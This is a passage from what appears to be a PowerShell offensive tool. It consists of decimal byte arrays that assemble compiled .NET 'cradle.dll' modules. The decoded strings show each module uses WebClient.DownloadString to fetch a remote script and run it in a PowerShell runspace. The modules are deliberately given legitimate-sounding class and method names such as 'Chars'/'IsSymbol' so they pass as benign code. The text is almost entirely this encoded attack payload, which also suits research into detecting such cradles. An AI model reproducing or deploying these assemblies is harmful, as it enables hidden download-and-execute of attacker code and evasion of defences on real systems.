0,0,0,0,0,3)+@(0)*11+@(24,0,169,0,0,0,0,0,4)+@(0)*11+@(1,0,37)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,65,114,114,97,121,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,32,0,0,0,0,0,20,139,227,199,210,190,45,78,184,200,85,193,152,251,18,118,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,196,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`180,51,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(224,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,56,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,196,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,164,3,0,0,8,0,0,0,35,85,83,0,172,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,188,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,44,0,37,0,6,0,118,0,86,0,6,0,150,0,86,0,10,0,255,0,216,0,10,0,15,1,216,0,10,0,44,1,187,0,14,0,86,1,75,1,6,0,111,1,37,0,6,0,166,1,135,1,10,0,179,1,187,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,51,0,10,0,1,0,157,32,0,0,0,0,134,24,58,0,16,0,3,0,0,0,1,0,64,0,0,0,2,0,68,0,17,0,58,0,20,0,25,0,58,0,16,0,33,0,24,1,34,0,41,0,39,1,16,0,49,0,55,1,39,0,49,0,62,1,44,0,57,0,58,0,16,0,57,0,96,1,50,0,65,0,118,1,55,0,49,0,125,1,62,0,49,0,188,1,68,0,9,0,58,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(180,0,0,0,4)+@(0)*11+@(1,0,28,0,0,0,0,0,3)+@(0)*11+@(25,0,187,0,0,0,0,0,4)+@(0)*11+@(1,0,37)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,65,114,114,97,121,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,0,3,59,0,0,0,0,0,194,39,150,75,173,108,199,67,185,0,232,57,47,66,150,52,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,8,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('Chars'         , 'IsSymbol'          , @("$CompiledHeader`70,47,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(36,35,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,172,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,208,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,72,2,0,0,8,0,0,0,35,85,83,0,80,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,96,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,97,0,65,0,6,0,129,0,65,0,10,0,181,0,170,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,109,32,0,0,0,0,134,24,59,0,15,0,2,0,0,0,1,0,166,0,17,0,59,0,19,0,25,0,59,0,15,0,33,0,59,0,15,0,33,0,191,0,24,0,9,0,59,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(159,0,0,0,2)+@(0)*11+@(1,0,27,0,0,0,0,0,2)+@(0)*11+@(1,0,36)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,104,97,114,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,73,115,83,121,109,98,111,108,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,3,32,0,0,0,0,0,18,39,121,87,249,177,7,78,151,221,49,192,57,177,159,126,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,76,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`89,47,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(156,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,0,4,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,164,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,116,3,0,0,8,0,0,0,35,85,83,0,124,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,140,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,43,0,36,0,6,0,101,0,69,0,6,0,133,0,69,0,10,0,238,0,199,0,10,0,254,0,199,0,10,0,27,1,170,0,14,0,69,1,58,1,6,0,135,1,104,1,10,0,148,1,170,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,50,0,10,0,1,0,146,32,0,0,0,0,134,24,59,0,15,0,2,0,0,0,1,0,65,0,17,0,59,0,19,0,25,0,59,0,15,0,33,0,7,1,33,0,41,0,22,1,15,0,49,0,38,1,38,0,49,0,45,1,43,0,57,0,59,0,15,0,57,0,79,1,49,0,49,0,94,1,54,0,49,0,157,1,60,0,9,0,59,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(163,0,0,0,4)+@(0)*11+@(1,0,27,0,0,0,0,0,3)+@(0)*11+@(24,0,170,0,0,0,0,0,4)+@(0)*11+@(1,0,36)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,67,104,97,114,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,73,115,83,121,109,98,111,108,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,32,0,0,0,0,0,10,236,130,120,170,164,79,73,182,154,5,200,163,100,157,104,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,196,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`109,47,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(224,36,0,0,75,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,56,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,4